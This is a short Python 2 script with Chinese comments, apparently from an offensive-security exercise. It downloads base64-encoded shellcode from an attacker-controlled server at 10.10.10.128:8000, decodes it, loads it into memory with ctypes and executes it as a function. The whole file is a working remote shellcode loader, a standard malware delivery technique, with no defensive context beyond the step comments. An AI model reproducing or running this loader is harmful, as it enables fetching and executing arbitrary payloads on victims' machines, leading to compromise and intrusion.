#-*- coding:utf8 -*-

import urllib2
import ctypes
import base64

# 从我们搭建的服务器下下载shellcode
url = "http://10.10.10.128:8000/shellcode.exe"
response = urllib2.urlopen(url)


# 解码shellcode
shellcode = base64.b64decode(response.read())
# 申请内存空间
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
# 创建shellcode的函数指针
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
# 执行shellcode
shellcode_func()